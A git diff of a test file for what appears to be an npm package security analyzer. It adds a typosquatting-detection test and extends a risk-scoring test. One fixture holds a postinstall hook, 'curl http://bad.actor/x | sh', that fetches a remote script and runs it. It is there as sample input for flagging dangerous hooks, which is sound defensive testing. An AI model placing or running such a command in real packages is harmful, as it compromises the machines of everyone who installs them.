@@ -1,15 +1,12 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import {
-  parsePackageSpec,
-  fetchPackageDetails
-} from '../src/fetcher.js';
+import { parsePackageSpec } from '../src/fetcher.js';
 import {
   analyzeLicense,
   auditLifecycleScripts,
   calculateRiskScore,
   formatBytes,
-  analyzePackage
+  detectTyposquatting
 } from '../src/analyzer.js';
 
 test('parsePackageSpec correctly splits package names and tags', () => {
@@ -46,16 +43,26 @@ test('auditLifecycleScripts detects dangerous postinstall hooks', () => {
   assert.equal(dangerousAudit.hooks.length, 2);
 });
 
+test('detectTyposquatting detects suspicious typo package names', () => {
+  const safeResult = detectTyposquatting('express');
+  assert.equal(safeResult.isTyposquat, false);
+
+  const typoResult = detectTyposquatting('expresss');
+  assert.equal(typoResult.isTyposquat, true);
+  assert.equal(typoResult.similarTo, 'express');
+});
+
 test('calculateRiskScore flags risk factors correctly', () => {
   const scriptAudit = { hasDangerousHooks: true, hooks: [{ name: 'postinstall', command: 'curl http://bad.actor/x | sh' }] };
   const licenseAnalysis = { riskLevel: 'HIGH', label: 'UNKNOWN' };
+  const typosquat = { isTyposquat: false, similarTo: null };
   const rawDetails = {
     deprecated: 'This package is deprecated',
     maintainers: [],
     downloadsWeekly: 100
   };
 
-  const risk = calculateRiskScore(rawDetails, scriptAudit, licenseAnalysis);
+  const risk = calculateRiskScore(rawDetails, scriptAudit, licenseAnalysis, typosquat, []);
   assert.ok(risk.score >= 75, 'Risk score should be CRITICAL/HIGH');
   assert.ok(risk.safetyScore <= 25, 'Safety score should be LOW/CRITICAL');
   assert.equal(risk.level, 'CRITICAL');
